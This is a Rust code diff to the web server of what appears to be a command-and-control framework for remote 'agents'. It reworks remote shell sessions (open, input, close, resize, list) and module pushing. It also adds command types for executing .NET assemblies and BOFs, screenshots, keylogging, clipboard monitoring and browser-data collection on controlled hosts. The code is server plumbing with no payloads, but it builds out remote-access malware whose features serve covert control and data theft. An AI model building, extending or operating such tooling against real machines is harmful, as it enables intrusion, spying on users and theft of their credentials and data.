@@ -38,19 +38,29 @@ pub struct CommandReply {
 
 #[derive(Serialize)]
 pub struct OpenShellReply {
-    pub session_id: String,
+    pub session_id: u32,
+    pub info: common::ShellInfo,
 }
 
 #[derive(Deserialize)]
 pub struct ShellInputRequest {
-    /// Base64-encoded bytes to write to the shell's stdin.
+    /// Text to write to the shell's stdin pipe.  A newline is appended
+    /// automatically if not present.
     pub data: String,
 }
 
-#[derive(Serialize)]
-pub struct ShellOutputReply {
-    /// Base64-encoded bytes read from the shell's stdout/stderr since last poll.
-    pub data: String,
+#[derive(Deserialize)]
+pub struct ShellResizeRequest {
+    /// Terminal width in columns.
+    pub cols: u16,
+    /// Terminal height in rows.
+    pub rows: u16,
+}
+
+#[derive(Deserialize)]
+pub struct OpenShellBody {
+    /// Optional path to the shell binary.
+    pub shell_path: Option<String>,
 }
 
 #[derive(Deserialize)]
@@ -117,7 +127,9 @@ pub fn router(state: Arc<AppState>, static_dir: std::path::PathBuf) -> Router {
         )
         .route("/agents/:id/shell", post(open_shell))
         .route("/agents/:id/shell/:sid/input", post(shell_input))
-        .route("/agents/:id/shell/:sid/output", get(shell_output))
+        .route("/agents/:id/shell/:sid/close", post(shell_close))
+        .route("/agents/:id/shell/:sid/resize", post(shell_resize))
+        .route("/agents/:id/shells", get(shell_list))
         .route("/agents/:id/push-module", post(push_module))
         // P2P mesh management endpoints.
         .route("/p2p/link", post(link_agents))
@@ -249,51 +261,95 @@ async fn open_shell(
     State(state): State<Arc<AppState>>,
     Extension(user): Extension<AuthenticatedUser>,
     Path(agent_id): Path<String>,
+    Json(body): Json<Option<OpenShellBody>>,
 ) -> Result<Json<OpenShellReply>, (StatusCode, String)> {
     let entry = state
         .find_by_agent_id(&agent_id)
         .ok_or((StatusCode::NOT_FOUND, "no agent with that agent_id".into()))?;
+    let shell_path = body.and_then(|b| b.shell_path);
     let req = CommandRequest {
-        command: Command::StartShell,
+        command: Command::CreateShell { shell_path },
     };
     let reply = dispatch_command(state, user, entry, req).await?;
-    let session_id = reply.0.output.unwrap_or_default();
-    Ok(Json(OpenShellReply { session_id }))
+    let output = reply.0.output.unwrap_or_default();
+    let info: common::ShellInfo = serde_json::from_str(&output)
+        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, format!("failed to parse shell info: {e}")))?;
+    Ok(Json(OpenShellReply {
+        session_id: info.session_id,
+        info,
+    }))
 }
 
 async fn shell_input(
     State(state): State<Arc<AppState>>,
     Extension(user): Extension<AuthenticatedUser>,
-    Path((agent_id, session_id)): Path<(String, String)>,
+    Path((agent_id, session_id)): Path<(String, u32)>,
     Json(req): Json<ShellInputRequest>,
 ) -> Result<StatusCode, (StatusCode, String)> {
     let entry = state
         .find_by_agent_id(&agent_id)
         .ok_or((StatusCode::NOT_FOUND, "no agent with that agent_id".into()))?;
-    let data = B64
-        .decode(&req.data)
-        .map_err(|_| (StatusCode::BAD_REQUEST, "invalid base64 in data field".into()))?;
     let cmd_req = CommandRequest {
-        command: Command::ShellInput { session_id, data },
+        command: Command::ShellInput {
+            session_id,
+            data: req.data,
+        },
     };
     let _ = dispatch_command(state, user, entry, cmd_req).await?;
     Ok(StatusCode::NO_CONTENT)
 }
 
-async fn shell_output(
+async fn shell_close(
     State(state): State<Arc<AppState>>,
     Extension(user): Extension<AuthenticatedUser>,
-    Path((agent_id, session_id)): Path<(String, String)>,
-) -> Result<Json<ShellOutputReply>, (StatusCode, String)> {
+    Path((agent_id, session_id)): Path<(String, u32)>,
+) -> Result<StatusCode, (StatusCode, String)> {
     let entry = state
         .find_by_agent_id(&agent_id)
         .ok_or((StatusCode::NOT_FOUND, "no agent with that agent_id".into()))?;
     let cmd_req = CommandRequest {
-        command: Command::ShellOutput { session_id },
+        command: Command::ShellClose { session_id },
     };
-    let reply = dispatch_command(state, user, entry, cmd_req).await?;
-    let data = reply.0.output.unwrap_or_default();
-    Ok(Json(ShellOutputReply { data }))
+    let _ = dispatch_command(state, user, entry, cmd_req).await?;
+    Ok(StatusCode::NO_CONTENT)
+}
+
+async fn shell_resize(
+    State(state): State<Arc<AppState>>,
+    Extension(user): Extension<AuthenticatedUser>,
+    Path((agent_id, session_id)): Path<(String, u32)>,
+    Json(req): Json<ShellResizeRequest>,
+) -> Result<StatusCode, (StatusCode, String)> {
+    let entry = state
+        .find_by_agent_id(&agent_id)
+        .ok_or((StatusCode::NOT_FOUND, "no agent with that agent_id".into()))?;
+    let cmd_req = CommandRequest {
+        command: Command::ShellResize {
+            session_id,
+            cols: req.cols,
+            rows: req.rows,
+        },
+    };
+    let _ = dispatch_command(state, user, entry, cmd_req).await?;
+    Ok(StatusCode::NO_CONTENT)
+}
+
+async fn shell_list(
+    State(state): State<Arc<AppState>>,
+    Extension(user): Extension<AuthenticatedUser>,
+    Path(agent_id): Path<String>,
+) -> Result<Json<Vec<common::ShellInfo>>, (StatusCode, String)> {
+    let entry = state
+        .find_by_agent_id(&agent_id)
+        .ok_or((StatusCode::NOT_FOUND, "no agent with that agent_id".into()))?;
+    let req = CommandRequest {
+        command: Command::ShellList,
+    };
+    let reply = dispatch_command(state, user, entry, req).await?;
+    let output = reply.0.output.unwrap_or_default();
+    let list: Vec<common::ShellInfo> = serde_json::from_str(&output)
+        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, format!("failed to parse shell list: {e}")))?;
+    Ok(Json(list))
 }
 
 /// Sign a module binary with Ed25519.
@@ -1235,10 +1291,6 @@ fn command_label(c: &Command) -> &'static str {
         Command::WriteFile { .. } => "WriteFile",
         Command::DeployModule { .. } => "DeployModule",
         Command::ExecutePlugin { .. } => "ExecutePlugin",
-        Command::StartShell => "StartShell",
-        Command::ShellInput { .. } => "ShellInput",
-        Command::ShellOutput { .. } => "ShellOutput",
-        Command::CloseShell { .. } => "CloseShell",
         Command::Shutdown => "Shutdown",
         Command::DiscoverNetwork => "DiscoverNetwork",
         Command::CaptureScreen => "CaptureScreen",
@@ -1280,6 +1332,22 @@ fn command_label(c: &Command) -> &'static str {
         Command::MeshQuarantine { .. } => "MeshQuarantine",
         Command::MeshClearQuarantine { .. } => "MeshClearQuarantine",
         Command::MeshSetCompartment { .. } => "MeshSetCompartment",
+        Command::ExecuteAssembly { .. } => "ExecuteAssembly",
+        Command::ExecuteBOF { .. } => "ExecuteBOF",
+        Command::CreateShell { .. } => "CreateShell",
+        Command::ShellInput { .. } => "ShellInput",
+        Command::ShellClose { .. } => "ShellClose",
+        Command::ShellList => "ShellList",
+        Command::ShellResize { .. } => "ShellResize",
+        Command::Screenshot { .. } => "Screenshot",
+        Command::KeyloggerStart => "KeyloggerStart",
+        Command::KeyloggerDump { .. } => "KeyloggerDump",
+        Command::KeyloggerStop => "KeyloggerStop",
+        Command::ClipboardMonitorStart { .. } => "ClipboardMonitorStart",
+        Command::ClipboardMonitorDump { .. } => "ClipboardMonitorDump",
+        Command::ClipboardMonitorStop => "ClipboardMonitorStop",
+        Command::ClipboardGet => "ClipboardGet",
+        Command::BrowserData { .. } => "BrowserData",
     }
 }
 
